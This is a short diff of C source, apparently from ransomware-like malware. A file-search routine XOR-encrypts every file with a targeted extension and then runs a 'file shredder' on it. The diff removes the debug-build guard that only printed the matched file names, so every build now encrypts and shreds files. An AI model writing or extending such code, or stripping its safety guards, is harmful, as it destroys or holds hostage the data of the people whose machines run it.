@@ -128,7 +128,6 @@ static void search_engine_class_start(
 
                 if (!lstrcmpi(currentFileExt, var->FileExt))
                 {
-#ifndef _DEBUG
                     xor_class_t* xor_class_obj = xor_class_create(currentFile);
                     if (xor_class_obj)
                     {
@@ -142,9 +141,6 @@ static void search_engine_class_start(
                         file_shredder_class_obj->method->fs_start(file_shredder_class_obj);
                         file_shredder_class_obj->method->fs_destroy(file_shredder_class_obj);
                     }
-#else
-                    _tprintf(_T("%s\n"), currentFile);
-#endif
                 }
             }
 
